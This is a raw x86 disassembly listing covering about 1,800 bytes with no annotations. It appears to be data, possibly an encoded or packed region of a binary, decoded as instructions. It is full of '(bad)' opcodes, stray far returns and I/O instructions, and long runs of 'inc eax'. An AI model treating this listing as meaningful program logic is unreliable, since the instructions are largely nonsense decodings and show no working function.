  4051fc:	adc    ah,dl
  4051fe:	jl     0x40522b
  405200:	mov    cl,0x40
  405202:	inc    eax
  405203:	add    BYTE PTR [eax+0x40],al
  405206:	inc    eax
  405207:	inc    eax
  405208:	inc    eax
  405209:	inc    eax
  40520a:	addr16 leave 
  40520c:	dec    edx
  40520d:	(bad)  
  40520e:	retf   
  40520f:	outs   dx,BYTE PTR ds:[esi]
  405210:	scas   al,BYTE PTR es:[edi]
  405211:	inc    eax
  405212:	inc    ebx
  405213:	mov    eax,0x7c2ca844
  405218:	or     DWORD PTR [eax-0xc37ea6f],edx
  40521e:	pop    esp
  40521f:	push   ecx
  405220:	shl    DWORD PTR [esi],1
  405222:	sub    eax,DWORD PTR [ebx-0x50]
  405225:	adc    DWORD PTR [eax],ebp
  405227:	jnp    0x405269
  405229:	mov    esi,0x40404045
  40522e:	inc    eax
  40522f:	inc    eax
  405230:	inc    eax
  405231:	inc    eax
  405232:	inc    eax
  405233:	inc    eax
  405234:	inc    eax
  405235:	mov    BYTE PTR ds:0xd0b4126b,al
  40523b:	shl    DWORD PTR [ebx],1
  40523d:	inc    esi
  40523e:	retf   0xb4ac
  405241:	jnp    0x4052a3
  405243:	xchg   esi,eax
  405244:	stc    
  405245:	mov    ds:0x404040b8,al
  40524a:	inc    eax
  40524b:	inc    eax
  40524c:	inc    eax
  40524d:	int3   
  40524e:	jne    0x405290
  405250:	or     eax,0x23429715
  405255:	pop    esi
  405256:	jl     0x40526d
  405258:	sub    cl,ch
  40525a:	jnp    0x405250
  40525c:	cmp    al,0x39
  40525e:	arpl   bx,cx
  405260:	es adc edx,edi
  405263:	and    dl,BYTE PTR [ecx+0x5da9aca1]
  405269:	pushf  
  40526a:	jnp    0x4052eb
  40526c:	push   ebx
  40526d:	ins    BYTE PTR es:[edi],dx
  40526e:	or     eax,0xdd0d3591
  405273:	xchg   ecx,eax
  405274:	inc    eax
  405275:	add    cl,al
  405277:	inc    eax
  405278:	inc    eax
  405279:	inc    eax
  40527a:	inc    eax
  40527b:	add    BYTE PTR [eax-0x2f],al
  40527e:	push   edx
  40527f:	inc    ebx
  405280:	mov    esp,0x427bcd40
  405285:	bound  ebx,QWORD PTR [eax-0x50]
  405288:	or     eax,0x32c040bc
  40528d:	push   ecx
  40528e:	arpl   WORD PTR ds:0x7b4841cb,cx
  405294:	cmp    eax,0x4ccbad5a
  405299:	mov    esi,ebp
  40529b:	and    edx,DWORD PTR [esi-0x7ba6a4ae]
  4052a1:	xor    BYTE PTR [eax+0x40],al
  4052a4:	inc    eax
  4052a5:	inc    eax
  4052a6:	inc    eax
  4052a7:	inc    eax
  4052a8:	inc    eax
  4052a9:	inc    eax
  4052aa:	inc    DWORD PTR [eax+0x68]
  4052ad:	jnp    0x4052f0
  4052af:	es sbb eax,0x6200c335
  4052b5:	push   es
  4052b6:	rol    BYTE PTR [edi],1
  4052b8:	xor    al,0xb8
  4052ba:	nop
  4052bb:	inc    eax
  4052bc:	push   eax
  4052bd:	jnp    0x40533a
  4052bf:	xor    BYTE PTR [ebp+0x5],al
  4052c2:	inc    edx
  4052c3:	inc    eax
  4052c4:	fadd   QWORD PTR [eax+0x40]
  4052c7:	inc    eax
  4052c8:	inc    eax
  4052c9:	inc    eax
  4052ca:	inc    eax
  4052cb:	inc    eax
  4052cc:	inc    eax
  4052cd:	inc    eax
  4052ce:	inc    eax
  4052cf:	imul   ecx,DWORD PTR [ecx-0x3],0x43407ba6
  4052d6:	addr16 jnp 0x4052cb
  4052d9:	pusha  
  4052da:	add    BYTE PTR [eax+0x4c70bc56],0x25
  4052e1:	add    ch,BYTE PTR [eax-0x4c2dffb]
  4052e7:	jp     0x4052a9
  4052e9:	icebp  
  4052ea:	adc    ebx,ecx
  4052ec:	add    al,0xc1
  4052ee:	imul   DWORD PTR [edi+0x40404011]
  4052f4:	inc    eax
  4052f5:	inc    eax
  4052f6:	inc    eax
  4052f7:	inc    eax
  4052f8:	inc    eax
  4052f9:	add    BYTE PTR [eax+0x44],al
  4052fc:	popa   
  4052fd:	pusha  
  4052fe:	inc    esp
  4052ff:	or     DWORD PTR [edx+0x7f],edi
  405302:	push   ecx
  405303:	push   eax
  405304:	dec    esp
  405305:	adc    eax,0xb1928c51
  40530a:	push   0xc
  40530c:	dec    ebp
  40530d:	(bad)  
  40530e:	les    eax,FWORD PTR ds:0x40404040
  405314:	inc    eax
  405315:	inc    eax
  405316:	and    eax,0x7a404040
  40531b:	xor    eax,0x598431f
  405320:	ret    
  405321:	xchg   ebp,esi
  405323:	icebp  
  405324:	ins    DWORD PTR es:[edi],dx
  405325:	retf   0x9068
  405328:	je     0x40534d
  40532a:	jp     0x40537c
  40532c:	push   edi
  40532d:	sbb    al,0x44
  40532f:	test   al,0x62
  405331:	sub    al,bl
  405333:	push   esp
  405334:	inc    eax
  405335:	inc    eax
  405336:	inc    eax
  405337:	inc    eax
  405338:	inc    eax
  405339:	inc    eax
  40533a:	inc    eax
  40533b:	inc    eax
  40533c:	inc    eax
  40533d:	inc    eax
  40533e:	dec    eax
  40533f:	bound  ebp,QWORD PTR [eax]
  405341:	adc    dl,al
  405343:	dec    esi
  405344:	jp     0x405335
  405346:	popf   
  405347:	mov    ds:0x75454177,al
  40534c:	cmp    edi,DWORD PTR [ebx]
  40534e:	dec    eax
  40534f:	xchg   ecx,eax
  405350:	popa   
  405351:	sar    DWORD PTR ds:0x40407a90,1
  405357:	inc    eax
  405358:	inc    eax
  405359:	inc    eax
  40535a:	inc    eax
  40535b:	rol    DWORD PTR [eax+0x40],0x6b
  40535f:	lahf   
  405360:	inc    ebp
  405361:	aad    0xc4
  405363:	pop    esi
  405364:	dec    ecx
  405365:	push   ds
  405366:	jno    0x4053b0
  405368:	sub    ah,BYTE PTR [ebx+0x56]
  40536b:	test   al,0xca
  40536d:	inc    eax
  40536e:	inc    eax
  40536f:	add    BYTE PTR [eax+0x40],al
  405372:	inc    eax
  405373:	inc    eax
  405374:	inc    eax
  405375:	inc    eax
  405376:	jp     0x4053b9
  405378:	lahf   
  405379:	cli    
  40537a:	inc    ebp
  40537b:	and    BYTE PTR [edx-0x40],ah
  40537e:	add    DWORD PTR [eax+0x3f],ebx
  405381:	mov    ah,0xe8
  405383:	or     dl,bh
  405385:	adc    bh,BYTE PTR [edx+0x39]
  405388:	dec    eax
  405389:	aad    0xa1
  40538b:	sub    BYTE PTR [eax+0x40],al
  40538e:	inc    eax
  40538f:	inc    eax
  405390:	inc    eax
  405391:	inc    eax
  405392:	inc    eax
  405393:	inc    eax
  405394:	inc    eax
  405395:	inc    eax
  405396:	(bad)  
  405397:	lds    esp,FWORD PTR [ebx+eiz*2-0x61]
  40539b:	bound  eax,QWORD PTR [ecx+edx*1-0x41]
  40539f:	dec    edi
  4053a0:	jp     0x4053b3
  4053a2:	dec    eax
  4053a3:	mov    eax,0x4f2ab062
  4053a8:	inc    edi
  4053a9:	inc    ebx
  4053aa:	lahf   
  4053ab:	inc    eax
  4053ac:	inc    eax
  4053ad:	inc    eax
  4053ae:	inc    eax
  4053af:	inc    eax
  4053b0:	inc    eax
  4053b1:	int3   
  4053b2:	jne    0x4053f4
  4053b4:	or     DWORD PTR ds:0x793f100d,0x13
  4053bb:	dec    eax
  4053bc:	jns    0x40538c
  4053be:	int    0xac
  4053c0:	pop    es
  4053c1:	stos   BYTE PTR es:[edi],al
  4053c2:	inc    edx
  4053c3:	lahf   
  4053c4:	inc    eax
  4053c5:	add    cl,al
  4053c7:	inc    eax
  4053c8:	inc    eax
  4053c9:	inc    eax
  4053ca:	inc    eax
  4053cb:	add    BYTE PTR [eax+0x52],al
  4053ce:	sub    DWORD PTR [eax+0x41],esi
  4053d1:	dec    eax
  4053d2:	jns    0x40544b
  4053d4:	push   0xad332ed6
  4053d9:	bound  ecx,QWORD PTR [ebp+0x38c8df78]
  4053df:	dec    esp
  4053e0:	xor    BYTE PTR [ecx-0x3c97ad87],ch
  4053e6:	pop    ebp
  4053e7:	add    eax,0x40404050
  4053ec:	inc    eax
  4053ed:	inc    eax
  4053ee:	inc    eax
  4053ef:	inc    eax
  4053f0:	inc    eax
  4053f1:	inc    DWORD PTR [eax+0x4c]
  4053f4:	lock das 
  4053f6:	fistp  QWORD PTR [edx]
  4053f8:	xor    BYTE PTR [ebx+0x38],bh
  4053fb:	lods   eax,DWORD PTR ds:[esi]
  4053fc:	jns    0x40547a
  4053fe:	or     dl,BYTE PTR [ebp+0xf824878]
  405404:	rol    DWORD PTR [eax+0x40],cl
  405407:	inc    eax
  405408:	inc    eax
  405409:	inc    eax
  40540a:	inc    eax
  40540b:	inc    eax
  40540c:	inc    eax
  40540d:	inc    eax
  40540e:	inc    eax
  40540f:	jo     0x405403
  405411:	arpl   WORD PTR [edx+0x70],cx
  405414:	jo     0x4053ca
  405416:	jns    0x40540b
  405418:	outs   dx,BYTE PTR ds:[esi]
  405419:	push   0xffffffcd
  40541b:	nop
  40541c:	inc    eax
  40541d:	inc    eax
  40541e:	inc    eax
  40541f:	inc    eax
  405420:	inc    eax
  405421:	inc    eax
  405422:	inc    eax
  405423:	inc    eax
  405424:	add    BYTE PTR [edx+0x62],ah
  405427:	adc    BYTE PTR ss:[ecx+0x24],cl
  40542b:	sbb    dl,BYTE PTR [eax]
  40542d:	inc    edx
  40542e:	add    BYTE PTR [ecx+0x50],bh
  405431:	push   eax
  405432:	shr    DWORD PTR [eax+0x19872a90],0x2f
  405439:	mov    ebp,0x345812aa
  40543e:	dec    eax
  40543f:	jns    0x405480
  405441:	sub    eax,0x4098f4a8
  405446:	inc    eax
  405447:	inc    eax
  405448:	inc    eax
  405449:	inc    eax
  40544a:	inc    eax
  40544b:	and    eax,0x42404040
  405450:	add    eax,0x1245917c
  405455:	inc    ecx
  405456:	pusha  
  405457:	push   ebx
  405458:	retf   
  405459:	jns    0x40543e
  40545b:	repnz inc esp
  40545d:	aas    
  40545e:	mov    WORD PTR ds:0x40405f51,cs
  405464:	inc    eax
  405465:	inc    eax
  405466:	inc    eax
  405467:	inc    eax
  405468:	inc    eax
  405469:	inc    eax
  40546a:	inc    eax
  40546b:	inc    eax
  40546c:	lock outs dx,BYTE PTR ds:[esi]
  40546e:	inc    ecx
  40546f:	sub    BYTE PTR [eax],ch
  405471:	leave  
  405472:	xor    eax,0x14463279
  405477:	adc    DWORD PTR [edx],ebp
  405479:	loopne 0x4054ec
  40547b:	inc    edx
  40547c:	inc    ebx
  40547d:	mov    ebx,0x7e5f8cb
  405482:	mov    edx,0x4542d078
  405487:	je     0x4054e0
  405489:	xlat   BYTE PTR ds:[ebx]
  40548a:	ret    
  40548b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40548c:	sub    eax,0x9c466ab3
  405491:	arpl   WORD PTR [ecx+0x40],ax
  405494:	inc    eax
  405495:	inc    eax
  405496:	inc    eax
  405497:	inc    eax
  405498:	inc    eax
  405499:	rol    DWORD PTR [eax+0x40],0x78
  40549d:	jle    0x4054e0
  40549f:	pop    eax
  4054a0:	push   edx
  4054a1:	lock in al,0x54
  4054a4:	mov    BYTE PTR [edi+0x50],al
  4054a7:	pop    edx
  4054a8:	stc    
  4054a9:	adc    ch,BYTE PTR [esi+edi*8+0x78]
  4054ad:	xchg   edx,eax
  4054ae:	xor    esp,DWORD PTR [eax+0x40004040]
  4054b4:	inc    eax
  4054b5:	inc    eax
  4054b6:	inc    eax
  4054b7:	inc    eax
  4054b8:	inc    eax
  4054b9:	xchg   esp,eax
  4054ba:	push   edi
  4054bb:	jne    0x40550c
  4054bd:	jmp    0x4054f3
  4054bf:	inc    ecx
  4054c0:	and    DWORD PTR [edx-0x42],0x4f784464
  4054c7:	cmp    edx,DWORD PTR [ecx+0x4a45a812]
  4054cd:	into   
  4054ce:	repnz sbb eax,0x3c578016
  4054d4:	or     al,0x78
  4054d6:	jl     0x40551a
  4054d8:	bound  edx,QWORD PTR ds:0x40400e9d
  4054de:	inc    eax
  4054df:	inc    eax
  4054e0:	inc    eax
  4054e1:	inc    eax
  4054e2:	inc    eax
  4054e3:	inc    eax
  4054e4:	inc    eax
  4054e5:	inc    eax
  4054e6:	retf   
  4054e7:	xor    DWORD PTR [ecx+0x10],eax
  4054ea:	clc    
  4054eb:	int    0xc8
  4054ed:	test   al,0x40
  4054ef:	js     0x4054c3
  4054f1:	daa    
  4054f2:	adc    dl,BYTE PTR [ecx]
  4054f4:	test   eax,0x7e148011
  4054f9:	inc    ecx
  4054fa:	dec    esp
  4054fb:	call   0x786bf5b4
  405500:	inc    eax
  405501:	inc    eax
  405502:	inc    eax
  405503:	inc    eax
  405504:	inc    eax
  405505:	inc    eax
  405506:	int3   
  405507:	jne    0x405549
  405509:	jae    0x40557c
  40550b:	or     BYTE PTR ds:0x77400d42,0x36
  405512:	and    bl,al
  405514:	retf   
  405515:	mov    edi,0x15784442
  40551a:	xchg   ecx,eax
  40551b:	inc    edx
  40551c:	xor    BYTE PTR [ebx-0x25],0x40
  405520:	pop    edx
  405521:	jl     0x405533
  405523:	out    0x5,al
  405525:	dec    edi
  405526:	test   al,0xd4
  405528:	inc    eax
  405529:	add    cl,al
  40552b:	inc    eax
  40552c:	inc    eax
  40552d:	inc    eax
  40552e:	inc    eax
  40552f:	add    BYTE PTR [eax+0x77],al
  405532:	mov    esi,0x3c4790f2
  405537:	arpl   WORD PTR [ebp+edi*4-0x41],cx
  40553b:	sub    ah,BYTE PTR [ebx+0x61]
  40553e:	inc    eax
  40553f:	inc    eax
  405540:	inc    eax
  405541:	inc    eax
  405542:	inc    eax
  405543:	inc    eax
  405544:	inc    eax
  405545:	inc    eax
  405546:	inc    DWORD PTR [eax+0x68]
  405549:	mov    edx,0x40407762
  40554e:	adc    eax,edx
  405550:	push   edi
  405551:	mov    BYTE PTR [eax-0x60],cl
  405554:	inc    eax
  405555:	das    
  405556:	inc    eax
  405557:	inc    eax
  405558:	inc    eax
  405559:	inc    eax
  40555a:	inc    eax
  40555b:	inc    eax
  40555c:	inc    eax
  40555d:	inc    eax
  40555e:	inc    eax
  40555f:	inc    eax
  405560:	fsub   DWORD PTR [edx-0x44]
  405563:	(bad)  
  405564:	adc    BYTE PTR [edi+0x60],dh
  405567:	clc    
  405568:	das    
  405569:	xor    edx,DWORD PTR [esi-0x40]
  40556c:	retf   
  40556d:	add    edx,0x36
  405570:	hlt    
  405571:	xor    al,0xd4
  405573:	gs inc eax
  405575:	ja     0x40558b
  405577:	rcl    DWORD PTR [edx-0x21],1
  40557a:	jo     0x405536
  40557c:	mov    eax,ds:0xc44440e6
  405581:	ds inc eax
  405583:	inc    eax
  405584:	inc    eax
  405585:	inc    eax
  405586:	inc    eax
  405587:	inc    eax
  405588:	inc    eax
  405589:	inc    eax
  40558a:	add    BYTE PTR [edi],dl
  40558c:	xor    BYTE PTR [ecx+0x4f547d77],al
  405592:	inc    eax
  405593:	and    al,0x4c
  405595:	inc    ebx
  405596:	leave  
  405597:	outs   dx,DWORD PTR ds:[esi]
  405598:	outs   dx,BYTE PTR ds:[esi]
  405599:	js     0x4055fc
  40559b:	lods   al,BYTE PTR ds:[esi]
  40559c:	call   0x4080cce3
  4055a1:	inc    eax
  4055a2:	inc    eax
  4055a3:	inc    eax
  4055a4:	inc    eax
  4055a5:	and    eax,0x43404040
  4055aa:	inc    eax
  4055ab:	sub    DWORD PTR ss:0x92c58e9,eax
  4055b2:	push   ecx
  4055b3:	lahf   
  4055b4:	add    eax,0x77695ccb
  4055b9:	ja     0x4055fd
  4055bb:	and    al,0x87
  4055bd:	push   esp
  4055be:	arpl   WORD PTR [edi+0x40],si
  4055c1:	inc    eax
  4055c2:	inc    eax
  4055c3:	inc    eax
  4055c4:	inc    eax
  4055c5:	inc    eax
  4055c6:	inc    eax
  4055c7:	inc    eax
  4055c8:	inc    eax
  4055c9:	inc    eax
  4055ca:	cmovp  esi,eax
  4055cd:	retf   0x1547
  4055d0:	div    DWORD PTR [edi+esi*2]
  4055d3:	xor    BYTE PTR [edi+0x74],ch
  4055d6:	xor    ecx,ebx
  4055d8:	sub    al,0x40
  4055da:	jb     0x40561c
  4055dc:	inc    eax
  4055dd:	inc    eax
  4055de:	inc    eax
  4055df:	inc    eax
  4055e0:	inc    eax
  4055e1:	rol    DWORD PTR [eax+0x40],0x4
  4055e5:	pop    esp
  4055e6:	arpl   WORD PTR [eax+0x77416248],dx
  4055ec:	inc    edx
  4055ed:	adc    BYTE PTR ds:0x7cc0c915,ch
  4055f3:	push   ebp
  4055f4:	xor    BYTE PTR [edx-0x58],bh
  4055f7:	jnp    0x4055ad
  4055f9:	inc    ebp
  4055fa:	ret    
  4055fb:	jbe    0x405600
  4055fd:	call   0xb848:0x2546ac78
  405604:	pop    edx
  405605:	dec    eax
  405606:	sub    dl,BYTE PTR ds:0x400a3e28
  40560c:	inc    eax
  40560d:	add    BYTE PTR [eax+0x40],al
  405610:	inc    eax
  405611:	inc    eax
  405612:	inc    eax
  405613:	inc    eax
  405614:	jbe    0x405660
  405616:	push   eax
  405617:	inc    ecx
  405618:	inc    esi
  405619:	fmul   st,st(1)
  40561b:	retf   
  40561c:	fwait
  40561d:	xchg   ebp,eax
  40561e:	xor    al,0x8e
  405620:	push   esi
  405621:	(bad)  
  405622:	stc    
  405623:	inc    eax
  405624:	jbe    0x4055ff
  405626:	inc    edx
  405627:	xor    BYTE PTR [eax+eax*2],al
  40562a:	inc    eax
  40562b:	inc    eax
  40562c:	inc    eax
  40562d:	inc    eax
  40562e:	inc    eax
  40562f:	inc    eax
  405630:	inc    eax
  405631:	inc    eax
  405632:	inc    eax
  405633:	stos   DWORD PTR es:[edi],eax
  405634:	mov    BYTE PTR [eax-0x3a6f0802],ah
  40563a:	push   ebx
  40563b:	dec    esp
  40563c:	or     eax,0x285b7681
  405641:	dec    edi
  405642:	lds    eax,FWORD PTR [ebp+ecx*8+0x871e149]
  405649:	inc    ebp
  40564a:	dec    edi
  40564b:	inc    ecx
  40564c:	adc    BYTE PTR [ebp+0x76],cl
  40564f:	shr    BYTE PTR [ebp-0x54],0xac
  405653:	mov    edx,0xf3c43cd8
  405658:	dec    esp
  405659:	inc    eax
  40565a:	inc    eax
  40565b:	inc    eax
  40565c:	inc    eax
  40565d:	inc    eax
  40565e:	inc    eax
  40565f:	int3   
  405660:	jne    0x4056a2
  405662:	cmp    eax,0xf805f00d
  405667:	jbe    0x4056ca
  405669:	popa   
  40566a:	ret    
  40566b:	jnp    0x4056e9
  40566d:	inc    ebx
  40566e:	dec    esp
  40566f:	daa    
  405670:	push   ecx
  405671:	bound  eax,QWORD PTR [ebx+0x40]
  405674:	add    cl,al
  405676:	inc    eax
  405677:	inc    eax
  405678:	inc    eax
  405679:	inc    eax
  40567a:	add    BYTE PTR [eax-0x7c],al
  40567d:	mov    edx,0x49761185
  405682:	loope  0x40560a
  405684:	or     eax,0xaec7831
  405689:	jne    0x4056d8
  40568b:	mov    ah,0xcb
  40568d:	push   es
  40568e:	arpl   WORD PTR [edi],si
  405690:	jbe    0x4056d3
  405692:	and    DWORD PTR [edx+0x45],esp
  405695:	ror    DWORD PTR [edi-0x10a892ed],0xc4
  40569c:	cs test al,0x40
  40569f:	inc    eax
  4056a0:	inc    eax
  4056a1:	inc    eax
  4056a2:	inc    eax
  4056a3:	inc    eax
  4056a4:	inc    eax
  4056a5:	inc    eax
  4056a6:	inc    DWORD PTR [eax+0x64]
  4056a9:	xor    eax,0x4f468b76
  4056ae:	enter  0x6211,0x41
  4056b2:	push   eax
  4056b3:	push   ebx
  4056b4:	and    DWORD PTR [eax+0x4f],eax
  4056b7:	inc    eax
  4056b8:	inc    eax
  4056b9:	inc    eax
  4056ba:	inc    eax
  4056bb:	inc    eax
  4056bc:	inc    eax
  4056bd:	inc    eax
  4056be:	inc    eax
  4056bf:	inc    eax
  4056c0:	inc    eax
  4056c1:	mov    eax,0xbf75b040
  4056c6:	outs   dx,DWORD PTR ds:[esi]
  4056c7:	mov    ah,0x24
  4056c9:	inc    edx
  4056ca:	mov    al,ds:0xa142b341
  4056cf:	inc    ecx
  4056d0:	test   eax,0x750569f1
  4056d5:	mov    al,0x62
  4056d7:	lds    eax,FWORD PTR [eax]
  4056d9:	fdiv   st,st(6)
  4056db:	inc    eax
  4056dc:	inc    eax
  4056dd:	inc    eax
  4056de:	inc    eax
  4056df:	inc    eax
  4056e0:	inc    eax
  4056e1:	inc    eax
  4056e2:	inc    eax
  4056e3:	add    BYTE PTR [esi+edx*4+0x3c1c6160],cl
  4056ea:	inc    eax
  4056eb:	xor    al,0x63
  4056ed:	jne    0x405745
  4056ef:	cmp    eax,0x62014063
  4056f4:	cmc    
  4056f5:	stc    
  4056f6:	xlat   BYTE PTR ds:[ebx]
  4056f7:	and    edi,DWORD PTR [esi-0x39b8cf12]
  4056fd:	jne    0x405758
  4056ff:	xchg   esp,eax
  405700:	(bad)  [eax+0x4040c000]
  405706:	inc    eax
  405707:	inc    eax
  405708:	inc    eax
  405709:	inc    eax
  40570a:	and    eax,0x4f404040
  40570f:	fdiv   QWORD PTR [ebp-0x5d]
  405712:	aad    0x12
  405714:	sub    al,ch
  405716:	inc    ecx
  405717:	jne    0x40575c
  405719:	shl    DWORD PTR [ebx-0x58],cl
  40571c:	adc    BYTE PTR [eax-0x182ec0bc],ch
  405722:	dec    ebx
  405723:	inc    edx
  405724:	inc    edx
  405725:	je     0x40575f
  405727:	jne    0x4056f3
  405729:	test   al,0x40
  40572b:	inc    eax
  40572c:	inc    eax
  40572d:	inc    eax
  40572e:	inc    eax
  40572f:	inc    eax
  405730:	inc    eax
  405731:	inc    eax
  405732:	inc    eax
  405733:	inc    eax
  405734:	les    esi,FWORD PTR [esi+0x22c316f6]
  40573a:	xor    esp,DWORD PTR [ecx-0xd]
  40573d:	xor    al,0x45
  40573f:	bound  ecx,QWORD PTR [ebp+esi*2-0x3f]
  405743:	dec    ebp
  405744:	pop    es
  405745:	fs inc eax
  405747:	inc    eax
  405748:	inc    eax
  405749:	inc    eax
  40574a:	inc    eax
  40574b:	inc    eax
  40574c:	rol    DWORD PTR [eax+0x40],0x36
  405750:	inc    eax
  405751:	add    al,BYTE PTR ds:0x1065e15e
  405757:	pushf  
  405758:	dec    edi
  405759:	retf   
  40575a:	jne    0x4057c4
  40575c:	mov    edi,0x404053
  405761:	inc    eax
  405762:	inc    eax
  405763:	inc    eax
  405764:	inc    eax
  405765:	inc    eax
  405766:	inc    eax
  405767:	test   BYTE PTR [eax+0x40],ch
  40576a:	inc    edi
  40576b:	push   0x5cc51fe
  405770:	xor    ebx,DWORD PTR [edi+0x6e]
  405773:	jne    0x4057bc
  405775:	and    esp,esp
  405777:	retf   
  405778:	dec    esp
  405779:	sub    BYTE PTR [eax+0x4b],bh
  40577c:	pop    edi
  40577d:	dec    eax
  40577e:	bound  eax,QWORD PTR [ecx+0xd]
  405781:	inc    eax
  405782:	inc    eax
  405783:	inc    eax
  405784:	inc    eax
  405785:	inc    eax
  405786:	inc    eax
  405787:	inc    eax
  405788:	inc    eax
  405789:	inc    eax
  40578a:	inc    eax
  40578b:	inc    edx
  40578c:	bound  esi,QWORD PTR [esp-0x5e]
  405790:	push   0xcf527b61
  405795:	scas   al,BYTE PTR es:[edi]
  405796:	mov    bl,0x2e
  405798:	or     BYTE PTR [eax-0x44],ah
  40579b:	inc    eax
  40579c:	inc    eax
  40579d:	inc    eax
  40579e:	inc    eax
  40579f:	inc    eax
  4057a0:	inc    eax
  4057a1:	int3   
  4057a2:	jne    0x4057e4
  4057a4:	xor    BYTE PTR [eax],ah
  4057a6:	je     0x4057fe
  4057a8:	inc    edi
  4057a9:	retf   
  4057aa:	imul   ecx,DWORD PTR ds:0x91916242,0xffffffa2
  4057b1:	mov    esp,0x40cb84
  4057b6:	rol    DWORD PTR [eax+0x40],0x40
  4057ba:	inc    eax
  4057bb:	add    BYTE PTR [eax+0x2a],al
  4057be:	add    eax,0x41044774
  4057c3:	or     eax,0xf48741b8
  4057c8:	pop    ecx
  4057c9:	inc    eax
  4057ca:	pop    ebp
  4057cb:	leave  
  4057cc:	add    eax,0x567440cb
  4057d1:	pusha  
  4057d2:	adc    al,0xec
  4057d4:	leave  
  4057d5:	push   ebx
  4057d6:	out    0xd7,al
  4057d8:	fisubr WORD PTR [edx+edx*2]
  4057db:	or     eax,0x40404040
  4057e0:	inc    eax
  4057e1:	inc    eax
  4057e2:	inc    eax
  4057e3:	inc    eax
  4057e4:	inc    DWORD PTR [eax+0x42]
  4057e7:	bound  edx,QWORD PTR [edi+0x15a14774]
  4057ed:	retf   
  4057ee:	and    BYTE PTR [ebx-0x6e80c59e],0xcd
  4057f5:	in     al,dx
  4057f6:	ret    
  4057f7:	and    al,0x1
  4057f9:	je     0x405864
  4057fb:	inc    eax
  4057fc:	inc    eax
  4057fd:	inc    eax
  4057fe:	inc    eax
  4057ff:	inc    eax
  405800:	inc    eax
  405801:	inc    eax
  405802:	inc    eax
  405803:	inc    eax
  405804:	inc    eax
  405805:	sub    eax,0xb3b84447
  40580a:	xchg   DWORD PTR ds:0x7ca6f854,ebx
  405810:	add    eax,0xf3744894
  405815:	inc    eax
  405816:	inc    eax
  405817:	inc    eax
  405818:	inc    eax
  405819:	inc    eax
  40581a:	inc    eax
  40581b:	inc    eax
  40581c:	inc    eax
  40581d:	add    BYTE PTR [edx+0x69],bh
  405820:	adc    bl,cl
  405822:	cmp    cl,BYTE PTR ds:0x9740bd00
  405828:	bound  edi,QWORD PTR [eax+edx*2-0x5f888b35]
  40582f:	enter  0x4f6b,0x62
  405833:	inc    eax
  405834:	inc    eax
  405835:	inc    eax
  405836:	inc    eax
  405837:	inc    eax
  405838:	inc    eax
  405839:	and    eax,0x51404040
  40583e:	arpl   WORD PTR [ebx+0x30],dx
  405841:	pop    ss
  405842:	mov    WORD PTR [esi],es
  405844:	lds    esi,FWORD PTR ds:0xc8fe5a74
  40584a:	and    edx,esp
  40584c:	dec    edi
  40584d:	inc    ebx
  40584e:	inc    esi
  40584f:	mov    bl,0x23
  405851:	jb     0x405881
  405853:	push   esi
  405854:	jne    0x405806
  405856:	inc    eax
  405857:	inc    eax
  405858:	inc    eax
  405859:	inc    eax
  40585a:	inc    eax
  40585b:	inc    eax
  40585c:	inc    eax
  40585d:	inc    eax
  40585e:	inc    eax
  40585f:	inc    eax
  405860:	jae    0x4058ab
  405862:	(bad)
  405865:	and    al,0x72
  405867:	cmp    eax,0x4fe377a9
  40586c:	adc    eax,0x40404040
  405871:	inc    eax
  405872:	inc    eax
  405873:	rol    DWORD PTR [eax+0x40],0xab
  405877:	(bad)  
  405879:	jae    0x4058d6
  40587b:	dec    ecx
  40587c:	inc    eax
  40587d:	leave  
  40587e:	or     eax,esi
  405880:	push   eax
  405881:	mov    WORD PTR [edx-0x766f975b],?
  405887:	mov    cl,cl
  405889:	jae    0x4058f3
  40588b:	sub    al,0x42
  40588d:	inc    ecx
  40588e:	pop    es
  40588f:	arpl   WORD PTR [eax-0x11],cx
  405892:	inc    esp
  405893:	and    DWORD PTR [eax+0x40409053],esp
  405899:	add    BYTE PTR [eax+0x40],al
  40589c:	inc    eax
  40589d:	inc    eax
  40589e:	inc    eax
  40589f:	inc    eax
  4058a0:	jmp    0xeff5cbaa
  4058a5:	test   al,0x20
  4058a7:	sub    DWORD PTR [ebx+ecx*8+0x408844d2],ebx
  4058ae:	inc    eax
  4058af:	inc    eax
  4058b0:	inc    eax
  4058b1:	inc    eax
  4058b2:	inc    eax
  4058b3:	inc    eax
  4058b4:	inc    eax
  4058b5:	inc    eax
  4058b6:	inc    eax
  4058b7:	bound  edx,QWORD PTR [eax+0x734d62c8]
  4058bd:	mov    edi,0xe50d4161
  4058c2:	dec    ebx
  4058c3:	inc    edx
  4058c4:	xor    eax,0x79304c44
  4058c9:	inc    eax
  4058ca:	inc    eax
  4058cb:	inc    eax
  4058cc:	inc    eax
  4058cd:	inc    eax
  4058ce:	inc    eax
  4058cf:	int3   
  4058d0:	jne    0x405912
  4058d2:	adc    dh,BYTE PTR [eax]
  4058d4:	aam    0x73
  4058d6:	mov    edi,0x84b07f21
  4058db:	int3   
  4058dc:	adc    eax,0xc43ab718
  4058e1:	or     eax,0x7329a1f4
  4058e6:	jge    0x4058c9
  4058e8:	dec    edi
  4058e9:	inc    eax
  4058ea:	add    cl,al
  4058ec:	inc    eax
  4058ed:	inc    eax
  4058ee:	inc    eax
  4058ef:	inc    eax
  4058f0:	add    BYTE PTR [eax+0x6b],al
  4058f3:	mov    ds:0x1f7b40a8,al
  4058f8:	test   DWORD PTR [eax-0x74],0x7340f5b0
  4058ff:	dec    edi
  405900:	in     eax,0x64
  405902:	or     eax,0x5e40cb2e
  405907:	pop    ds
  405908:	nop
  405909:	cmp    cl,bl
  40590b:	retf   
  40590c:	push   edx
  40590d:	cmp    BYTE PTR [ebx-0x2],dh
  405910:	mov    eax,ds:0x40ac46c3
  405915:	lods   al,BYTE PTR ds:[esi]
  405916:	inc    eax
  405917:	inc    eax
  405918:	inc    eax
  405919:	inc    eax
  40591a:	inc    eax
  40591b:	inc    eax
  40591c:	inc    eax
  40591d:	inc    eax
  40591e:	inc    DWORD PTR [eax+0x41]
  405921:	repz idiv DWORD PTR [ecx+eax*2+0x7244c905]
  405929:	push   eax
  40592a:	loop   0x405941
  40592c:	xchg   esp,eax
  40592d:	leave  
  40592e:	sub    bh,ah
  405930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405931:	jno    0x405954
  405933:	inc    esi
  405934:	inc    eax
  405935:	inc    eax
  405936:	inc    eax
  405937:	inc    eax
  405938:	inc    eax
  405939:	inc    eax
  40593a:	inc    eax
  40593b:	inc    eax
  40593c:	inc    eax
  40593d:	inc    eax
